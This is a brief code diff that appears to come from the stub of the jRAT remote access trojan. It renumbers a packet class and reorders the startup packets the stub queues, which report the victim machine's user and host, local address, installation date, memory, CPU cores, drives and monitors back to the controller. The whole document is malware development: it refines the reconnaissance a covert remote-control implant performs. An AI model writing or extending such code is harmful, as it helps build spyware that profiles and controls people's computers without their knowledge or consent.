@@ -39,7 +39,7 @@ import se.jrat.stub.packets.outgoing.Packet5InitUserHost;
 import se.jrat.stub.packets.outgoing.Packet61InitMonitors;
 import se.jrat.stub.packets.outgoing.Packet62InitDrives;
 import se.jrat.stub.packets.outgoing.Packet13InitTotalMemory;
-import se.jrat.stub.packets.outgoing.Packet64InitAvailableCores;
+import se.jrat.stub.packets.outgoing.Packet14InitAvailableCores;
 import se.jrat.stub.packets.outgoing.Packet67LoadedPlugins;
 import se.jrat.stub.packets.outgoing.Packet6InitVersion;
 import se.jrat.stub.packets.outgoing.Packet7InitServerID;
@@ -154,6 +154,7 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet11InitInstallationDate());
 		addToSendQueue(new Packet12InitLocalAddress());
 		addToSendQueue(new Packet13InitTotalMemory());
+		addToSendQueue(new Packet14InitAvailableCores());
 
 
 
@@ -171,7 +172,6 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet62InitDrives(File.listRoots()));
 
 
-		addToSendQueue(new Packet64InitAvailableCores(Runtime.getRuntime().availableProcessors()));
 
 		addToSendQueue(new Packet61InitMonitors(GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()));
 		
